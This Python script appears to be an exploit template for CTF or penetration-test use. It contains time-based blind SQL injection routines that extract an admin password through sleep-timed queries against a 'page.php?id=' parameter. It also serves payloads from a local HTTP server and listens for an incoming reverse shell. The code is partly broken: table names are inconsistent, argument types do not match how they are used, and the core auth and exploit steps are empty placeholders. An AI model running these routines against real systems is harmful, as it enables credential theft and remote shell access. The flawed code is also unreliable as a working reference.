#!/usr/bin/python
import requests, logging, SocketServer, json
from pwn import *
from pwnlib.context import Thread as ServerThread
from bs4 import BeautifulSoup
from SimpleHTTPServer import SimpleHTTPRequestHandler
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests, SocketServer, argparse
from urllib import quote, unquote
from pwn import *
from sys import argv, exit

context.log_level = 'info'


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, req, client_addr, server):
        # self.payload = server.payload
        self.server = server
        SimpleHTTPRequestHandler.__init__(self, req, client_addr, server)

    def do_GET(self):
        log.debug('received connection')
        response = open(self.server.payload, 'rb').read() \
            if self.server.payload != '' else ''
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)

    def do_POST(self):
        log.debug('received connection')
        response = open(self.server.payload, 'rb').read() \
            if self.server.payload != '' else ''
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-length", len(response))
        self.end_headers()
        self.wfile.write(response)


class Server(SocketServer.TCPServer):
    def __init__(self, payload, ip_address='0.0.0.0', port=80):
        self.payload = payload
        SocketServer.TCPServer.__init__(self, (ip_address, port), Handler)

    def start_limited(self):
        self.handle_request()
        return self

    def start(self):
        self.serve_forever()
        return self


class Exploit:
    def __init__(
            self,
            redirect=False,
            proxy_address='',
            ip_address=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.session = requests.session()
        self.redirect = redirect
        self.ip_address = ip_address
        self.timeout = 0.5
        self.threads = {}
        self.shell = None
        self.server = None
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'RequestVerificationToken': '',
        }
        self.query_params = {
            'PickerDialogType': ''
        }
        self.form_values = {
            '__REQUESTDIGEST': '',
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': '',
            '__VIEWSTATEGENERATOR': '',
            '__CALLBACKID': '',
            '__CALLBACKPARAM': '',
            '__EVENTVALIDATION': '',
            '__RequestVerificationToken': ''
        }
        self.cookies = {}

    def do_get(self, url, params={}, data={}):
        log.debug('executing get request')
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params
        )
        # self.session.get().elapsed.total_seconds()

    def do_post(self, url, data={}, params={}):
        log.debug('executing post request')
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params
        )

    # self.session.get().elapsed.total_seconds()

    def to_json(self, resp):
        text = resp.text
        json_obj = json.loads(text.encode('ascii'))
        # log.debug('json object value %s' % json_obj['value'])
        return json_obj

    def parse_page(self, content):
        log.debug('parsing page form')
        soup = BeautifulSoup(content, 'lxml')
        for key, val in self.form_values.iteritems():
            for tag in soup.select('input[name=%s]' % key):
                try:
                    self.form_values[key] = tag['value']
                except Exception as error:
                    log.debug('error for key %s error %s' % (key, str(error)))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def exploit(self):
        log.info('exploiting target')
        # place holder
        # place holder
        return self

    def auth(self):
        log.info('authenticating with target')
        # place holder
        # place holder
        return self

    def do_request(self, target, query):
        log.debug('request to %s query %s' % (target, unquote(query)))
        r = self.do_get(
            url='http://{0}:80/page.php?id={1}'.format(target, query)
        )
        return r.elapsed.total_seconds()

    def do_length(self, target='', start=0, end=400, limit=0):
        log.info('extracting length')
        for idx in range(start, end):
            log.debug('trying %d' % idx)
            delay = self.do_request(
                target,
                quote(
                    "(select if(char_length("
                    "(select password "
                    "from `user` "
                    "where username = 'admin' "
                    "limit {0},1)"
                    ")={1},sleep({2}),0))"\
                    .format(str(limit), str(idx), str(self.timeout))
                )
            )
            log.debug('delay %d' % int(delay))
            if int(delay) == 1:
                log.success('found the size %d' % int(idx))
                return idx
        log.debug('unable to extract the size')
        return

    def do_value(self, target, length, limit=0):
        log.info('extracting value %d id %d' % (length, limit))
        value = ''
        for idx in range(1, length + 1):
            log.debug('iteration {0}'.format(str(idx)))
            for c in range(32, 126):
                delay = self.do_request(
                    target,
                    quote(
                        "(select if((ascii(substring(("
                        "(select password "
                        "from `users` "
                        "where username = 'admin' "
                        "limit {0},1)"
                        "),{1},1)))={2},sleep({3}),1))"\
                        .format(str(limit), str(idx), str(c), str(self.timeout))
                    )
                )
                log.debug('delay %d' % int(delay))
                if int(delay) == 1:
                    log.success('found the char %s (password: %s..)' % (chr(c), value))
                    value += chr(c)
            if len(value) == length:
                log.success('extracted the value %s' % value)
                return value
            else:
                log.debug('unable to extract the value %s' % value)
        return value

    def start_server(self, payload, port=80):
        log.info('starting payload server')
        self.server = Server(payload=payload, ip_address=self.ip_address, port=port)
        self.threads[payload] = ServerThread(target=self.server.start_limited, args=())
        self.threads[payload].start()
        return self

    def listen(self, port=443):
        log.info('starting listener')
        self.shell = listen(port)
        return self

    def interact(self):
        log.info('waiting for connection..')
        time.sleep(self.timeout)
        self.shell.wait_for_connection().interactive()
        for thread in self.threads.keys():
            log.info('closing threads')
            self.threads[thread].join()

if __name__ == '__main__':
    try:
        # argument parsing example
        parser = argparse.ArgumentParser(add_help=True, description='Exploit <description>')
        parser.add_argument('-target', action='store', help='Target address <http(s)://IP/URL>')
        parser.add_argument('-payload', action='store', help='Payload to serve from server <bypass.json,file,...>')
        parser.add_argument('-server-ip', action='store_true', help='IP for the server <IP>')
        parser.add_argument('-server-port', action='store_true', help='PORT for the server <80>')
        parser.add_argument('-shell-port', action='store_true', help='PORT for the shell <443>')
        parser.add_argument('-proxy', action='store_true', help='IP and PORT for the proxy server <10.0.0.2:8080>')
        parser.add_argument('-debug', action='store_true', default=False, help='Turn DEBUG output ON')

        if len(argv) == 1:
            parser.print_help()
            exit(1)

        options = parser.parse_args()

        solution = Exploit(
            ip_address=options.server_ip,
            proxy_address=options.proxy,
        ) \
            .listen(port=int(options.shell_port)) \
            .start_server(
            payload=options.payload,
            port=int(options.server_port)
        )

        if options.debug():
            solution.debug()

        solution \
            .auth() \
            .exploit() \
            .interact()
    except Exception as error:
        log.debug('error in main: %s' % str(error))
